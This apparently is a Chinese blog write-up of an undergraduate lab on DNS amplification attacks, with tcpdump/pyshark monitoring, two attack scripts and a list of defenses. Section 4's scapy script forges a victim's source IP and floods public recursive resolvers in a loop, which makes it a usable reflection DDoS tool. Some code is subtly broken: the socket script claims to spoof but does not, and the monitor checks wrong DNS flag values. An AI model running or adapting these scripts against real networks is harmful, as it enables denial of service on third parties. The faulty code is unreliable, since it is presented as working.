前言：
此文章内容是我本科毕设的网络安全部分的一个小小实验尝试，最后好像没成功，这是当时GPT写的一部分流程，刚才又让copilot整理了一下，仅供测试使用。不保证内容真实性，实际环境尝试时请小心谨慎，在符合网络安全条件的情况下尝试，避免引起不必要的麻烦。

本文记录了DNS放大攻击的基本原理以及在本地测试环境下的实验过程。实验仅用于网络安全学习和防御研究，请勿在实际网络环境中进行非法测试。

## 1. DNS放大攻击概述

DNS放大攻击是一种分布式拒绝服务(DDoS)攻击的变种，攻击者利用开放的DNS递归解析服务器，通过发送伪造源IP地址(即受害者IP)的DNS请求，使DNS服务器将大量响应数据发送到受害者服务器，从而造成网络拥塞或服务瘫痪。

攻击的放大效果来源于DNS响应包通常比请求包大得多，特别是在请求特定记录类型(如ANY或TXT)时更为显著。

## 2. 实验环境搭建

### 2.1 实验拓扑

- **被攻击端**：树莓派 (IP: 192.168.1.101)
- **攻击端**：PC (Mac/Windows)
- **开放的递归DNS服务器**：用于测试的DNS服务器

### 2.2 所需工具

- **被攻击端**：tcpdump, Python (pyshark库)
- **攻击端**：
  - 基础版：Python (socket库)
  - 高级版：Python (scapy库)

## 3. 被攻击端监测实现

被攻击端需要搭建流量监测工具来实时捕获和分析流量，以观察DNS放大攻击的特征。

### 3.1 流量捕获方案

1. **使用tcpdump捕获网络流量**
2. **使用Python分析流量特征**

### 3.2 安装必要工具

```bash
# 安装tcpdump (Debian/Ubuntu系统)
sudo apt-get install tcpdump

# 安装pyshark库
pip install pyshark
```

### 3.3 使用tcpdump捕获DNS流量

```bash
# 捕获并保存DNS流量
sudo tcpdump -i eth0 udp port 53 -w /tmp/dns_traffic.pcap

# 或实时查看DNS流量
sudo tcpdump -i eth0 udp port 53
```

参数说明：
- `-i eth0`：指定监控的网络接口
- `udp port 53`：过滤DNS相关流量
- `-w /tmp/dns_traffic.pcap`：将捕获的数据包保存到文件

### 3.4 Python流量分析脚本

```python
import pyshark

# 读取tcpdump生成的PCAP文件
cap = pyshark.FileCapture('/tmp/dns_traffic.pcap', display_filter='dns')

# 初始化计数器
dns_request_count = 0
dns_response_count = 0

# 解析每个数据包
for packet in cap:
    try:
        if 'DNS' in packet:
            # DNS请求
            if packet.dns.flags == '0x0001':  # 请求标志
                dns_request_count += 1
            # DNS响应
            elif packet.dns.flags == '0x8001':  # 响应标志
                dns_response_count += 1
    except AttributeError:
        # 过滤掉没有DNS层的包
        continue

    # 打印统计信息
    print(f"请求数: {dns_request_count}, 响应数: {dns_response_count}")

    # 检测攻击特征
    if dns_response_count > dns_request_count:
        print("警告：DNS响应数量大于请求数量，可能是DNS放大攻击流量！")

# 输出最终统计结果
print(f"DNS请求总数: {dns_request_count}")
print(f"DNS响应总数: {dns_response_count}")
```

### 3.5 持续监控方案

设置定时执行脚本可以实现持续监控：

```bash
# 每10秒检查一次流量
watch -n 10 python3 monitor_dns_traffic.py
```

## 4. 攻击端实现

以下提供两种攻击实现方式，仅供学习网络安全原理使用。

### 4.1 基础版攻击脚本 (使用socket库)

```python
import socket
import random
import time

# 配置参数
target_ip = "192.168.1.100"  # 被攻击的目标服务器IP
dns_server = "8.8.8.8"       # 开放的递归DNS服务器
domain_name = "example.com"  # 查询的域名

# 构造DNS请求包
def build_dns_request(domain):
    # DNS包头 (ID, 标志字段, 问题数目)
    dns_header = b"\xaa\xaa"  # 随机ID
    dns_header += b"\x01\x00"  # 标志字段，标准查询
    dns_header += b"\x00\x01"  # 1个问题
    dns_header += b"\x00\x00"  # 0个答案
    dns_header += b"\x00\x00"  # 0个授权记录
    dns_header += b"\x00\x00"  # 0个附加记录

    # DNS问题部分 (域名 + 查询类型 + 查询类)
    domain_parts = domain.split(".")
    question = b""
    for part in domain_parts:
        question += bytes([len(part)]) + part.encode()
    question += b"\x00"  # 结束标志
    question += b"\x00\x01"  # 查询类型 A (IPv4 地址)
    question += b"\x00\x01"  # 查询类 IN (Internet)

    return dns_header + question

# 发送伪造的DNS请求
def send_dns_request():
    # 创建UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # 构造DNS请求包
    dns_request = build_dns_request(domain_name)

    while True:
        try:
            # 伪造源IP为目标IP
            spoofed_ip = target_ip
            
            # 发送请求到DNS服务器
            sock.sendto(dns_request, (dns_server, 53))
            print(f"发送DNS请求到 {dns_server}，伪造源IP：{spoofed_ip}")
            
            # 控制请求速率
            time.sleep(0.1)
        except KeyboardInterrupt:
            print("攻击停止。")
            break

# 主函数
if __name__ == "__main__":
    print(f"开始向目标服务器 {target_ip} 发起DNS放大攻击...")
    send_dns_request()
```

### 4.2 高级版攻击脚本 (使用scapy库)

```python
from scapy.all import *
import random
import time

# 配置参数
target_ip = "192.168.1.106"    # 被攻击的目标服务器IP
dns_server = "101.226.4.6"     # 开放的递归DNS服务器
domain_name = "www.baidu.com"  # 查询的域名

# 构造DNS请求包
def build_dns_request(domain):
    dns_query = IP(dst=dns_server, src=target_ip) / UDP(dport=53, sport=random.randint(1024, 65535)) / \
                DNS(rd=1, qd=DNSQR(qname=domain, qtype="A"))
    return dns_query

# 发送伪造的DNS请求
def send_dns_request():
    while True:
        try:
            # 构造DNS请求包
            dns_request = build_dns_request(domain_name)
            
            # 发送DNS请求到DNS服务器
            send(dns_request, verbose=0)  # 设置verbose=0以减少输出
            print(f"发送DNS请求到 {dns_server}，伪造源IP：{target_ip}")
            
            # 控制请求速率
            time.sleep(0.1)  # 可以调整时间间隔控制发送频率
        except KeyboardInterrupt:
            print("攻击停止。")
            break

# 主函数
if __name__ == "__main__":
    print(f"开始向目标服务器 {target_ip} 发起DNS放大攻击...")
    send_dns_request()
```

## 5. 实验结果观察

在实验过程中，可以通过以下方式观察攻击效果：

1. 在被攻击端运行流量监测脚本，观察DNS请求与响应数量的差异
2. 监控被攻击端网络接口流量变化
3. 观察被攻击端系统资源占用情况

## 6. 防御措施

DNS放大攻击的常见防御措施包括：

1. **入站流量过滤**：配置防火墙过滤异常DNS响应流量
2. **带宽管理**：为DNS流量设置限速
3. **DNS服务器配置**：关闭开放递归解析，或限制递归查询来源
4. **部署DDoS防御设备**：使用专业的DDoS防御设备过滤异常流量
5. **使用CDN服务**：利用CDN分散流量并过滤攻击

## 7. 结论

本文通过实验演示了DNS放大攻击的基本原理和实现方法，并提供了监测和防御思路。了解攻击原理有助于设计更有效的防御策略，提高网络安全性。

## 参考资料

1. DNS协议规范 (RFC 1035)
2. CERT关于DNS放大攻击的安全公告
3. 网络安全防御最佳实践指南

## mac攻击win时的Wireshark抓包截图

![wireshark抓包截图](/images/dns-test.jpg)
